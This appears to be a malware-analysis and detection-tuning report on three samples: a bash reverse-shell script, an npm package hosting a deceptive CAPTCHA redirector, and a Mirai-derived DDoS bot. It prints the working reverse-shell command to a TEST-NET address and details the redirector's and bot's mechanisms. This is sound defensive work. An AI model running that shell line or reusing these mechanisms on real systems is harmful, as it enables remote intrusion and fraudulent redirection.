method: Read RULES.md and TAXONOMY.md; atomscan slow scans and cleave facts, source analysis, rizin disassembly and independently decoded ELF tables. Native/shell bytes were not executed. Seven HTML paths ran in isolated QuickJS with stubbed network/DOM/navigation and fixture AES-CTR data. No embedded endpoint contacted.

evidence: 53 bytes: shebang and bash -i >& /dev/tcp/192.0.2.42/4444 0>&1. Bash attempts an outbound TCP connection; on success it assigns stdout/stderr to that socket and duplicates the descriptor to stdin before invoking the interactive shell.

192.0.2.42 is in RFC 5737 TEST-NET-1. The minimal transparent example and non-production endpoint tip the balance to BENIGN; training/lab provenance is inferred, not independently established. No operator authorization, special network route or installation context was supplied.

Both hostile reverse-shell findings and the suspicious parsed-command observation accurately describe the executable mechanism and are retained without an address-based exception. A BENIGN artifact judgment does not make these capabilities disappear.
samples.marker_line: Bash TCP shell example: TEST-NET target; retain accurate detections

samples.identification: @worrisome/reutil 1.0.5: npm-hosted deceptive Cloudflare redirect landing page
evidence: Tarball contains only package.json and index.html. The manifest exports the HTML page, with no install hook or fetched dependency. This is browser-delivered lure infrastructure rather than evidence of install-time compromise.

resolveHostUrl POSTs a lookup key to api.keyval.org/get, parses val as counter:ciphertext, Base64-decodes both, imports its embedded 256-bit AES key and decrypts with AES-CTR and a 128-bit counter. The result becomes a URL.

fetchPolicyRedirectUrl sends cid to the decrypted origin at /api/strategies/check. Successful redirect_url responses are used before showing CAPTCHA. Otherwise it renders Cloudflare-styled security text and a fabricated random Ray ID.

CAPTCHA success, error, expiry, timeout and unsupported callbacks all invoke the same redirect path without validating a token. All visitor query parameters are appended to the selected destination and location.replace navigates there.

The deceptive verification UI, unconditional failure navigation and concealed remotely selected destination establish a malicious redirector. The primary OX Security campaign report specifically lists @worrisome/reutil and corroborates this mechanism. No shipped credential form, actual final payload, ClickFix command, or successful credential theft was established.
samples.marker_line: @worrisome/reutil: deceptive CAPTCHA redirects; correct crypto trait

samples.identification: Stripped statically linked i386 NeTiS/Condi-tagged Mirai-derived DDoS bot
evidence: ELF32 i386, 212832 bytes, statically linked and stripped; executable code is present, not a benign administration tool repackaged with only a corpus label. No signature or legitimate deployment configuration was supplied.

main at 0x80567d0 initializes the string table and bot configuration, overwrites argv[0] with httpd and invokes prctl option 15 at 0x80568a3 through the wrapper at 0x8069874 (i386 syscall 172). It forks, detaches and closes descriptors 0, 1 and 2.

main unlinks argv[0] through 0x8069bfb. At 0x8056948 it resolves /proc/self/exe; at 0x8056957 it calls remove via 0x806a010; at 0x805696a it opens that resolved path with 0x241 (O_WRONLY|O_CREAT|O_TRUNC) and mode 0777, subject to ordinary OS success/failure.

0x8057740 and 0x80577c0 apply the four bytes of 0xdeadbeef to each record byte. Their effective XOR key is 0x22. Independently reproducing the transform recovers the controller hostname, busybox command strings, HTTP response fields and browser UA pool. Config resolver 0x8056760 uses table entry 3 and sets port 1995; no live lookup was attempted.

main receives length-prefixed controller messages at 0x8056e6a/0x8056e9c, parses them at 0x8056ec2 through 0x804a530 and dispatches via 0x804a110. This forks workers and timers, selects a registered method, then invokes its function pointer at 0x804a2b5. The repeated send loop at 0x80545dd calls the socket-send wrapper 0x8067f3e and repeats across its packet/socket tables.

The HTTP code reads decoded table entries 45 and 46 (DOSarrest and cloudflare-nginx server fields), handles cookies/redirects/framing, and chooses from table entries 47-51 containing browser UAs. These are used by code, not just inert string indicators.

The procfs executable walker at 0x80563d0 calls readdir, builds /proc/%d/exe, resolves it at 0x805646e, skips its own/PID1 and an allowlist including main_<arch> names, then selects temporary/application paths and calls kill(pid,9) at 0x80564e4. The maps counterpart at 0x8056540 also has kill code; its path-buffer handling appears defective, so runtime success is not claimed.

Timed remote tasking, repetitive attack sends, process disguise, image removal and arbitrary competing-process termination establish a malicious bot independently of AV votes. Architecture names are exclusions, not evidence of payload downloads. Telnet-related table strings alone do not establish an active propagation path.

changes: Four generic HTTP server-banner literals moved unchanged from objectives/impact/dos/http to communications/http/fingerprint, with no DoS mappings on the atoms. Existing flood composites keep their evidence and criticality; descriptions now state co-occurrence instead of claiming a comparison data flow.

The WebCrypto aggregate moved to crypto/decrypt with an honest name. It now requires a known decrypt method; an unspecified indexed SubtleCrypto method also matched encrypt/digest/importKey. The redundant indexed-call atom was consolidated into the existing js-computed-property-call observation, which retains the call mechanism and receiver in its evidence. The misleading symmetric-decryption and Decrypt Data claims were removed. Dot/bracket decrypt methods retain coverage.

The two direct WebCrypto consumers and both symmetric/decrypt ancestor consumers were updated with the precise moved decrypt reference. Broad crypto selectors intentionally no longer treat opaque indexed calls as decryption. No parent selectors target the moved HTTP atoms or LZRD subtree; the root objectives/impact consumer in CrystalX still requires genuine impact evidence rather than a lone HTTP server banner.

The generic OST /cdn-cgi/ suffix and its header-delimiter composite moved unchanged to communications/http/message at notable severity. A normal POST request can match these strings and cannot establish LZRD identity or DoS. The branded LZRD HTTP profile still requires the same request evidence through its updated reference.

Added notable, architecture/section-scoped Linux i386 unlink and prctl syscall-stub detections. Disassembly binds their actual uses to image removal and process naming in this sample; the generic traits claim only syscall-stub presence.

verification.retained_attack_controls: Both existing decrypt redirect fixtures, branded LZRD profile and original bot retain their hostile detections. The native sample keeps four hostile traits; archive keeps five and HTML member keeps four.
verification.material_detection_loss: No supported attack behavior lost on the three samples or retained positive controls. The native sample loses one unsupported suspicious LZRD label while retaining its request fragment at notable severity. Encryption/digest/key-import near misses intentionally lose two decryption-specific hostile composites.
verification.classifier_disagreement: All three classifier verdicts remain HOSTILE. The shell is judged BENIGN based on its example endpoint and minimal packaging, with accurate reverse-shell traits retained. The npm HTML member has low ML probability (~0.070) despite four evidence-supported hostile traits; the outer archive remains ML HOSTILE.
verification.validation: Final action: make validate; requires exit 0 and no warnings.
